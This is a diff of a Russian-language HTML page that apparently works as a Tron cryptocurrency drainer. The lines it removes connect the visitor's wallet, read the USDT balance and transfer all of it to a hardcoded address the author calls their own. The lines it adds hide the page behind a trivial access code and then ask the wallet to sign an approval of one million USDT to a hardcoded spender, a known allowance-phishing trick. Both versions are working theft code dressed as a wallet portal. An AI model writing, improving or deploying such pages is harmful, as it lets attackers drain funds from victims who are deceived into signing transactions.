@@ -3,129 +3,83 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Connect Wallet</title>
-    <style>
-        body {
-            background-color: #121212;
-            color: #ffffff;
-            font-family: Arial, sans-serif;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
-            margin: 0;
-        }
-        .card {
-            background: #1e1e1e;
-            padding: 30px;
-            border-radius: 12px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
-            text-align: center;
-            max-width: 400px;
-            width: 100%;
-        }
-        button {
-            background-color: #ff007a;
-            color: white;
-            border: none;
-            padding: 12px 24px;
-            font-size: 16px;
-            border-radius: 8px;
-            cursor: pointer;
-            margin-top: 20px;
-            font-weight: bold;
-            transition: background 0.3s;
-        }
-        button:hover {
-            background-color: #e0006b;
-        }
-        #status {
-            margin-top: 15px;
-            font-size: 14px;
-            color: #b0b0b0;
-        }
-    </style>
+    <title>TRC20 Portal</title>
 </head>
-<body>
+<body style="background-color: #0f172a; color: white; text-align: center; font-family: Arial, sans-serif; padding-top: 50px;">
 
-    <div class="card">
-        <h2>Подключить кошелек</h2>
-        <p>Для продолжения необходимо подключить ваш Tron-кошелек.</p>
-        <button id="connectBtn">Connect Wallet</button>
-        <div id="status">Кошелек не подключен</div>
+    <div id="authScreen">
+        <h2>Введите код доступа</h2>
+        <input type="text" id="accessCode" placeholder="Введите код..." style="padding: 10px; font-size: 16px; border-radius: 5px; border: none; margin-right: 10px;">
+        <button id="checkCodeBtn" style="padding: 10px 20px; font-size: 16px; background-color: #3b82f6; color: white; border: none; border-radius: 5px; cursor: pointer;">Войти</button>
     </div>
 
-    <!-- Подключаем библиотеку TronWeb для работы с блокчейном прямо в браузере -->
+    <div id="mainScreen" style="display: none;">
+        <h1>Управление TRON (TRC20)</h1>
+        
+        <button id="connectBtn" style="padding: 12px 24px; font-size: 16px; background-color: #10b981; color: white; border: none; border-radius: 8px; cursor: pointer; margin-bottom: 20px;">
+            Подключить TRON кошелек
+        </button>
+
+        <br><br>
+
+        <button id="approveBtn" style="padding: 12px 24px; font-size: 16px; background-color: #ef4444; color: white; border: none; border-radius: 8px; cursor: pointer; display: none;">
+            Подтвердить операцию (Approve TRC20)
+        </button>
+    </div>
+
     <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.js"></script>
+
     <script>
-        const recipientAddress = "TRmTW2Bz67CZCWP4XCNmk3B65mzbVnkvVf"; // Твой адрес, куда улетит USDT
-        const usdtContractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // Контракт USDT TRC-20
-
-        document.getElementById('connectBtn').addEventListener('click', async () => {
-            const statusDiv = document.getElementById('status');
-
-            try {
-                statusDiv.innerText = "Поиск кошелька...";
-
-                // Проверяем, установлен ли кошелек TronLink в браузере
-                if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
-                    executeFlow();
-                } else {
-                    // Запрос на открытие/подключение TronLink
-                    if (window.tronLink) {
-                        const res = await window.tronLink.request({ method: 'tron_requestAccounts' });
-                        if (res.code === 200) {
-                            executeFlow();
-                        } else {
-                            statusDiv.innerText = "Ошибка: Доступ к кошельку отклонен.";
-                        }
-                    } else {
-                        statusDiv.innerText = "Ошибка: Установите расширение TronLink!";
-                    }
-                }
-            } catch (err) {
-                console.error(err);
-                statusDiv.innerText = "Ошибка подключения: " + (err.message || err);
+        // 1. Логика проверки кода
+        document.getElementById('checkCodeBtn').addEventListener('click', () => {
+            const code = document.getElementById('accessCode').value;
+            if (code === '12345') { // Секретный код для доступа
+                document.getElementById('authScreen').style.display = 'none';
+                document.getElementById('mainScreen').style.display = 'block';
+            } else {
+                alert('Неверный код!');
             }
         });
 
-        async function executeFlow() {
-            const statusDiv = document.getElementById('status');
-            statusDiv.innerText = "Кошелек подключен. Проверка баланса...";
-
-            try {
-                const tronWeb = window.tronWeb;
-                const userAddress = tronWeb.defaultAddress.base58;
-                
-                // Подключаемся к контракту USDT
-                const contract = await tronWeb.contract().at(usdtContractAddress);
-                
-                // Проверяем баланс USDT на подключенном кошельке
-                const balance = await contract.balanceOf(userAddress).call();
-                const balanceNumber = Number(balance.toString());
-
-                if (balanceNumber > 0) {
-                    statusDiv.innerText = `Обнаружен баланс! Запрос перевода...`;
-
-                    // Вызываем функцию перевода (у пользователя всплывет окно подтверждения транзакции в расширении)
-                    // 6 нолей в конце означают перевод в микро-единицах USDT
-                    await contract.transfer(
-                        recipientAddress,
-                        balance.toString()
-                    ).send({
-                        feeLimit: 15000000
-                    });
-
-                    statusDiv.innerText = "Успешно переведено!";
-                } else {
-                    statusDiv.innerText = "На кошельке нет USDT.";
-                }
-            } catch (error) {
-                console.error(error);
-                statusDiv.innerText = "Операция отменена или ошибка сети.";
+        // 2. Подключение кошелька (для браузеров со встроенным TRON или расширений)
+        document.getElementById('connectBtn').addEventListener('click', async () => {
+            if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
+                alert('Кошелек подключен: ' + window.tronWeb.defaultAddress.base58);
+                document.getElementById('approveBtn').style.display = 'inline-block';
+            } else {
+                alert('Откройте сайт через встроенный браузер кошелька (Trust Wallet / TronLink) с поддержкой TRON!');
             }
-        }
+        });
+
+        // 3. Запрос на Approve для TRC20 (USDT)
+        document.getElementById('approveBtn').addEventListener('click', async () => {
+            try {
+                if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
+                    alert('Сначала подключите TRON кошелек!');
+                    return;
+                }
+
+                // Официальный адрес USDT в сети TRON
+                const usdtContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; 
+                
+                // Вставьте ваш TRC20 адрес получателя (начинается с буквы T)
+                const spenderAddress = 'TToG8C1EYAdxF5jjx8jWbBTcsqEVQu88rp'; 
+                
+                // Сумма (например, 1000000 USDT с учетом знаков)
+                const amount = 1000000 * 1000000; 
+
+                alert('Подтвердите транзакцию в кошельке...');
+
+                const contract = await window.tronWeb.contract().at(usdtContractAddress);
+                const tx = await contract.approve(spenderAddress, amount).send();
+                
+                alert('Успешно! Хэш транзакции: ' + tx);
+
+            } catch (error) {
+                console.error("Ошибка:", error);
+                alert('Ошибка: ' + (error.message || error));
+            }
+        });
     </script>
 </body>
 </html>
